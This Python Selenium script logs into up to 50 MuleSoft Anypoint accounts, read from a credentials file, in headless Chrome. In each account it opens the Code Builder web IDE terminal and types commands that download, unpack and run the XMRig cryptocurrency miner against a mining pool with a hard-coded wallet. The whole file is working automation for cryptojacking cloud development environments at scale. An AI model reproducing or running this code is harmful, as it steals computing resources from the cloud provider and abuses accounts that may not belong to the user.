from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

import time
import threading
import os
chrome_driver_path = "/usr/local/bin/chromedriver"
login_url = "https://anypoint.mulesoft.com/login/"
sss = 1
focusl = threading.Lock()
with open("acc.txt", "r") as file:
    accounts = [line.strip().split(":") for line in file.readlines()]

import socket
from contextlib import closing

def find_free_port():
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        s.bind(('', 0))
        return s.getsockname()[1]
port = find_free_port()
def open_browser(instance_number, email, password):
    options = webdriver.ChromeOptions() # Critical for Docker/Linux
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-client-side-phishing-detection")
    options.add_argument("--enable-logging")
    options.add_argument("--log-level=3")
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-background-networking")
    options.add_argument("--headless")
    options.add_argument(f"--remote-debugging-port={port}")
    options.add_argument("--disable-extensions")
    options.add_argument("--blink-settings=imagesEnabled=false")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-renderer-backgrounding")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-software-rasterizer")
    options.add_argument("--window-size=800,600")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.add_experimental_option("detach", True)

    
    try:
      service = Service(executable_path=chrome_driver_path, port=port)
      driver = webdriver.Chrome(service=service, options=options)
      with focusl:
        driver.get(login_url)
        print(f"{email} Open Chrome")
        wait = WebDriverWait(driver, 30) 
        try:
            username_field = wait.until(EC.presence_of_element_located((By.ID, "nameInput")))
            password_field = driver.find_element(By.ID, "passwordInput")
            username_field.send_keys(email)
            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)
            print(f"[{email}] ✅ Login submitted.")
        except Exception as e:
            print(f"[{email}] ❌ Login fields not found: {e}")

        if "codebuilder" not in driver.current_url:
            driver.get("https://anypoint.mulesoft.com/codebuilder/")

        try:
            launch_button = wait.until(EC.element_to_be_clickable((By.ID, "launch-your-webide-btn-card")))
            launch_button.click()
            print(f"[{email}] ✅ Clicked Launch button")
        except:
            print(f"[{email}] ❌ Launch button not found")
        original_window = driver.current_window_handle

# Wait for new window/tab to open
        WebDriverWait(driver, 30).until(EC.number_of_windows_to_be(2))

# Switch to the new window
        for handle in driver.window_handles:
            if handle != original_window:
                driver.switch_to.window(handle)
                break  #

        print("Switched to Code Builder window")
        time.sleep(150)
        print(driver.current_url)
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
        try:
            textarea = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-screen")))
            textarea.click()
            print("✅ Command executed.")
        except:
            print(f"[{email}] ❌ area not found ")
    
        try:
            textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
            print("SUCCES")        
            textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email}#u7pd-53qq -p x --tls --threads=4 -k")
            textarea1.send_keys(Keys.ENTER)
            sss += 1
        except:
            print(f"[{email}] ❌ terminal not found ")

    except Exception as e:
        print(f"[{email}] ❌ Error: {str(e)}")

# Launch multiple instances
threads = []
for i, (email, password) in enumerate(accounts[:50]):
    
    thread = threading.Thread(target=open_browser, args=(i, email, password))
    thread.start()
    threads.append(thread)
    time.sleep(20)  # Prevent overload

for thread in threads:
    thread.join()

print("✅ All Chrome instances launched and optimized.")
print(f"SUCCES LAUNCH {sss} WORKER")
          
